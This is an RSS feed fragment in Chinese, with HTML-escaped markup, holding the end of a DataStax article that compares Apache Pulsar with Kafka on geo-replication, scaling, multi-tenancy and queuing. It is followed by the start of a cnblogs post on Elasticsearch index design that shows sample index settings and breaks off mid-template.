&lt;li class=&quot;Editable-styled public-DraftStyleDefault-orderedListItem public-DraftStyleDefault-depth0 public-DraftStyleDefault-listLTR&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;ekegi-0-0&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;ekegi-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;队列&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;7o38g-0-0&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;7o38g-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;我们解决了所有这些问题。让我们逐项看下。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span data-offset-key=&quot;b8mf3-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;01 跨地域复制&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;d5jf4-0-0&quot;&gt;
&lt;div class=&quot;public-DraftStyleDefault-block public-DraftStyleDefault-ltr&quot; data-offset-key=&quot;d5jf4-0-0&quot;&gt;&lt;span data-offset-key=&quot;d5jf4-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Cassandra 支持数据中心内或跨数据中心的同步和异步复制。（通常，Cassandra 被配置为区域内的同步复制，以及跨区域的异步复制。）这使得&lt;a class=&quot;Link ztext-link&quot; href=&quot;https://www.slideshare.net/VinayKumarChella/cassandra-serving-netflix-scale&quot; target=&quot;_blank&quot; data-offset-key=&quot;d5jf4-1-0&quot; data-editable=&quot;true&quot;&gt;&lt;span data-offset-key=&quot;d5jf4-1-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;像Netflix这样的Cassandra用户&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span data-offset-key=&quot;d5jf4-2-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;可以为各地的客户提供低延迟的服务，遵守数据主权规定，并且可以经受住基础设施故障。（ 当 AWS 需要重启 218 个 Cassandra 节点修补一个安全漏洞时，“&lt;a class=&quot;Link ztext-link&quot; href=&quot;https://www.infoq.com/news/2014/10/netflix-cassandra/&quot; target=&quot;_blank&quot; data-offset-key=&quot;d5jf4-3-0&quot; data-editable=&quot;true&quot;&gt;&lt;span data-offset-key=&quot;d5jf4-3-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Netflix经历了0宕机&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span data-offset-key=&quot;d5jf4-4-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;”。）&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;6f42g-0-0&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;6f42g-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Kafka 被设计为在单个区域内运行，不支持跨数据中心的复制。Kafka 部署区域之外的客户端只能忍受延迟增加。有几个项目试图在客户端层面向 Kafka 添加跨数据中心的复制，但操作都很困难，而且容易失败。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;278uq-0-0&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;278uq-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;和 Cassandra 一样，Pulsar 在核心服务器上构建了跨地域复制功能。（也像 Cassandra 一样，你可以在部署时选择同步或异步配置，并且可以按主题配置复制机制。）生产者可以从任何地区写入共享主题，Pulsar 负责确保这些信息对各地的消费者均可见。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;span&gt;&lt;img src=&quot;https://pic2.zhimg.com/80/v2-1630b3ad348a8261061d0683c3505612_1440w.png&quot; width=&quot;908&quot; height=&quot;413&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;664&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic1.zhimg.com/v2-1630b3ad348a8261061d0683c3505612.png&quot; data-watermark-src=&quot;https://pic4.zhimg.com/v2-296316d644d6da87df13953daeaa9aa9.png&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;&lt;span data-offset-key=&quot;fibqd-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;02 扩展&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;8htkt-0-0&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;8htkt-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;在 Kafka 中，存储单元是一个段文件，但是复制单元是一个分区中的所有段文件。每个分区都归一个 leader 代理所有，它会复制给多个 follower。所以，当你需要给 Kafka 集群增加容量时，在新节点分担现有节点的负载之前，有些分区需要复制到新节点上。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-09ab63c8624c8a15125855a69da2d349_1440w.png&quot; width=&quot;942&quot; height=&quot;436&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;676&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic1.zhimg.com/v2-09ab63c8624c8a15125855a69da2d349.png&quot; data-watermark-src=&quot;https://pic4.zhimg.com/v2-0e1d00d7f563d2e4a7dd6f581d892df6.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;436pc-0-0&quot; readability=&quot;9&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;436pc-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;这意味着，&lt;span data-offset-key=&quot;436pc-0-1&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;增加 Kafka 集群的容量会使其变慢，而不是变快&lt;span data-offset-key=&quot;436pc-0-2&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;。如果你的容量规划恰到好处，这很好，但如果业务需求的变化比你预期的要快，那么这可能会是一个严重的问题。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;id0f-0-0&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;id0f-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Pulsar 增加了一个间接层。（Pulsar 也将计算和存储分开，分别由 broker 和 bookie 管理，但这里，最重要的部分是 Pulsar 如何通过 Bookkeeper 增加复制的粒度。）在 Pulsar 中，分区被分割成 ledger，但和 Kafka 段不同，ledger 可以单独复制，互不影响。Pulsar 在 Zookeeper 中维护着一个 ledger 到分区的映射。因此，当我们向集群添加一个新的存储节点时，我们所要做的就是在该节点上启动一个新的 ledger。现有的数据可以保留在原来的位置，不需要集群做额外的工作。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-37c546feb917801645ef288f1b439dd7_1440w.png&quot; width=&quot;1054&quot; height=&quot;809&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;1120&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic2.zhimg.com/v2-37c546feb917801645ef288f1b439dd7.png&quot; data-watermark-src=&quot;https://pic1.zhimg.com/v2-b86eaad0a372f95884358b78a3c6aeda.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;&lt;span data-offset-key=&quot;db80e-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;03 多租户&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;8ttmf-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;8ttmf-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;多租户基础设施可以跨多个用户和组织共享，同时保证它们彼此隔离。一个租户的活动不应该影响其他租户的安全或 SLA。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;1f5im-0-0&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;1f5im-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;从根本上说，多租户可以从两个方面降低成本。首先，简单地共享单个租户没有充分利用的基础设施——将组件的成本分摊到所有用户。第二，通过简化管理——当有几十、几百或几千个租户时，管理一个实例明显简单许多。即使在一个容器化的世界里，“在这样一个共享系统上给我分配一个帐户”也比“为我提供这个服务的一个新实例”容易实现得多。全球性的问题可能由于分散在许多实例中而被掩盖。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;1v8k5-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;1v8k5-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;与跨地域复制一样，多租户很难移植到没有这项设计的系统上。Kafka 是单租户设计，但 Pulsar 从内核上就支持多租户。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic2.zhimg.com/80/v2-a6957df69ca6422bff1c81ea0bd45891_1440w.png&quot; width=&quot;992&quot; height=&quot;853&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;1256&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic1.zhimg.com/v2-a6957df69ca6422bff1c81ea0bd45891.png&quot; data-watermark-src=&quot;https://pic1.zhimg.com/v2-6ea58619af81e9ac398595eb55221ae3.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;7imls-0-0&quot;&gt;

&lt;div class=&quot;public-DraftStyleDefault-block public-DraftStyleDefault-ltr&quot; data-offset-key=&quot;7imls-0-0&quot;&gt;&lt;span data-offset-key=&quot;7imls-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Pulsar 允许我们通过一个接口管理跨多个区域的多个租户，该接口包括身份验证和授权、隔离策略（Pulsar 可以选择在集群中划分出专供单个租户使用的硬件）和存储配额。CapitalOne 在&lt;a class=&quot;Link ztext-link&quot; href=&quot;https://medium.com/capital-one-tech/apache-pulsar-one-cluster-for-the-entire-enterprise-using-multi-tenancy-ac0bd925fbdf&quot; target=&quot;_blank&quot; data-offset-key=&quot;7imls-1-0&quot; data-editable=&quot;true&quot;&gt;&lt;span data-offset-key=&quot;7imls-1-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;这里&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span data-offset-key=&quot;7imls-2-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;对 Pulsar 的多租户做了很好的概述。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;ceib8-0-0&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;ceib8-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;DataStax 提供的新 Pulsar 控制台进一步简化了这项工作。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span data-offset-key=&quot;1oqv2-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;04 队列（也即流）&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;ordj-0-0&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;ordj-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Kafka 提供了一个经典的发布/订阅（publish/subscribe）消息模型——发布者发送消息给 Kafka，后者在主题中按分区排序，并给每个订阅者（或”消费者“）发送一份副本。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic4.zhimg.com/80/v2-2096c423f0debbef608c858996ea9ee3_1440w.png&quot; width=&quot;906&quot; height=&quot;366&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;590&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic3.zhimg.com/v2-2096c423f0debbef608c858996ea9ee3.png&quot; data-watermark-src=&quot;https://pic4.zhimg.com/v2-0e1a8a3872d6152d2d80e6f7e03aeca7.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;1klg6-0-0&quot; readability=&quot;9&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;1klg6-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Kafka 用日志中的偏移量记录消费者已经看到了哪条消息。这意味着消息不能乱序确认，同时也意味着不能跨多个消费者共享订阅。（在其消费者分组设计中，Kafka 允许将多个分区映射到一个消费者，但不能反过来。）&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;1o41p-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;1o41p-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;这对于发布/订阅用例（有时称为流）来说很好。对于流，重要的是要以与消息发布时相同的顺序消费消息。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;79v5d-0-0&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-offset-key=&quot;79v5d-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Pulsar 支持发布/订阅模式，但也支持排队模式，在后一种情况下，处理顺序并不重要，我们只想在任意数量的消费者之间平衡一个主题的消息：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;Image-resizerContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;Image-captionContainer&quot; data-size=&quot;normal&quot;&gt;
&lt;div&gt;&lt;img src=&quot;https://pic2.zhimg.com/80/v2-642dcc6a260fd1c19c033fc21de72555_1440w.png&quot; width=&quot;1018&quot; height=&quot;520&quot; class=&quot;Image FocusPlugin--unfocused Image--isBlock&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1460&quot; data-rawheight=&quot;746&quot; data-watermark=&quot;original&quot; data-original-src=&quot;https://pic1.zhimg.com/v2-642dcc6a260fd1c19c033fc21de72555.png&quot; data-watermark-src=&quot;https://pic2.zhimg.com/v2-9851d53cb4ca9c50d7081f42a949eb6e.png&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;8ibak-0-0&quot; readability=&quot;9&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;8ibak-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;这（以及面向队列的特性，如“死信队列”和支持重新发送的否定确认）意味着 Pulsar 经常可以取代 AMQP 和 JMS 以及 Kafka 风格的发布/订阅，采用 Pulsar 的企业有机会进一步降低成本。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span data-offset-key=&quot;e0et6-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;05 小结&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;9reds-0-0&quot;&gt;
&lt;div class=&quot;public-DraftStyleDefault-block public-DraftStyleDefault-ltr&quot; data-offset-key=&quot;9reds-0-0&quot;&gt;&lt;span data-offset-key=&quot;9reds-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;与 Kafka 相比，Pulsar 的架构使它在跨地域复制、扩展、多租户和队列等方面具有重要的优势。1 月 27 日，DataStax 宣布收购&lt;a class=&quot;Link ztext-link&quot; href=&quot;https://kesque.com/&quot; target=&quot;_blank&quot; data-offset-key=&quot;9reds-1-0&quot; data-editable=&quot;true&quot;&gt;&lt;span data-offset-key=&quot;9reds-1-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Kesque&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span data-offset-key=&quot;9reds-2-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;（Pulsar 即服务），加入到了 Pulsar 社区，并开源了 Kesque 团队在&lt;a class=&quot;Link ztext-link&quot; href=&quot;https://www.datastax.com/products/luna-streaming&quot; target=&quot;_blank&quot; data-offset-key=&quot;9reds-3-0&quot; data-editable=&quot;true&quot;&gt;&lt;span data-offset-key=&quot;9reds-3-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;Luna Streaming&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span data-offset-key=&quot;9reds-4-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;中构建的管理和监控工具。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;Editable-unstyled&quot; data-block=&quot;true&quot; data-editor=&quot;e3bih&quot; data-offset-key=&quot;cqifh-0-0&quot; readability=&quot;7&quot;&gt;

&lt;p&gt;&lt;span data-offset-key=&quot;cqifh-0-0&quot;&gt;&lt;span data-text=&quot;true&quot;&gt;本文由DataStax CTO Jonathan Ellis原创 最初发布在DataStax博客中&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;

</description>
<pubDate>Fri, 19 Feb 2021 14:48:00 +0000</pubDate>
<dc:creator>DataStax</dc:creator>
<og:description>与 Kafka 相比，Pulsar 的架构使它在跨地域复制、扩展、多租户和队列等方面具有重要的优势。 1 月 27 日，DataStax 宣布收购Kesque（Pulsar 即服务），加入到了 Pul</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/datastax/p/14418578.html</dc:identifier>
</item>
<item>
<title>elasticsearch如何设计索引 - 一寸HUI</title>
<link>http://www.cnblogs.com/zsql/p/14418018.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zsql/p/14418018.html</guid>
<description>&lt;p&gt;&lt;span&gt;本文为博客园作者所写： &lt;a href=&quot;https://home.cnblogs.com/u/zsql/&quot;&gt;一寸HUI&lt;/a&gt;，个人博客地址：&lt;a href=&quot;https://www.cnblogs.com/zsql/&quot;&gt;https://www.cnblogs.com/zsql/&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最近在做es相关的工作，所以记录下自己的一些想法，可能很多方面不会很全面，但是基本都是经过验证的。本文主要是围绕着思考，从多个方面进行考虑，怎么设计索引比较好，直接进入主题吧，本文的es版本为elasticsearch7.8.1。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;一、索引设计的重要性&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　首先索引创建后，索引的分片只能通过_split和_shrink接口对其进行成倍的增加和缩减，主要是因为es的数据是通过_routing分配到各个分片上面的，所以本质上是不推荐去改变索引的分片数量的，因为这样都会对数据进行重新的移动。还有就是索引只能新增字段，不能对字段进行修改和删除，缺乏灵活性，所以每次都只能通过_reindex重建索引了。还有就是一个分片的大小以及所以分片数量的多少严重影响到了索引的查询和写入性能。所以可想而知，设计一个好的索引能够减少后期的运维管理和提高不少性能。所以前期对索引的设计是相当的重要的。&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;好的索引设计在整个集群规划中占据举足轻重的作用，索引的设计直接影响集群设计的好坏和复杂度。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;好的索引设计应该是充分结合业务场景的时间维度和空间维度，结合业务场景充分考量增、删、改、查等全维度设计的。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;好的索引设计是完全基于“设计先行，编码在后”的原则，前期会花很长时间，为的是后期工作更加顺畅，避免不必要的返工&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;二、如何设计索引&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　在设计索引之前我们要明白索引有些什么内容，明白索引的构成，比如索引的基本配置setting，映射mapping，还有重要的分片，副本，模板，索引的生命周期等。知道这些之后就可以有针对性的设计了。首先要结合公司的业务场景，数据量的大小，每天增量如何，数据的特点，会不会对历史数据进行重新更新。数据存多久，是永久还是有一定的周期。数据需要准实时呢还是不需要准实时呢。所以清楚索引的构成和知道业务场景，才能够结合起来做更好的设计。&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;2.1、考虑索引的公共基本配置&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;由于elasticsearch7.x不允许把索引级别的设置配置在elasticsearch.yml中，所以需要对每个索引进行单独的配置，这样的话就比较麻烦，所以可以把这些公共的配置配置在索引模板中，这样就可以在新建索引的时候可以自动的设置到索引中，关于索引模板的操作可以看考：&lt;a class=&quot;postTitle2 vertical-middle&quot; href=&quot;https://www.cnblogs.com/zsql/p/14381646.html&quot;&gt;聊聊elasticsearch7.8的模板和动态映射&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来看看一些常用索引级别的配置&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number_of_replicas&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;1&lt;/span&gt;&lt;span&gt;, #推荐副本数为1
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;max_result_window&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;100000&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;refresh_interval&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;30s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, #这里对实时性要求不高，可以增加该值提高写入性能
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 10s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 5s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 2s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 500ms,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 1s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 800ms,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 500ms,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 200ms,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 10s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 5s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 2s,
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: 500ms
&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dynamic&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt; #是否关闭动态字段映射，默认为true，这里选择个人选择禁用&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;当然索引的配置还有很多其他的，可以根据实际情况进行调整，这样就可以把需要配置公共索引配置设计成索引模板：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;PUT _index_template/&lt;span&gt;template_index
{
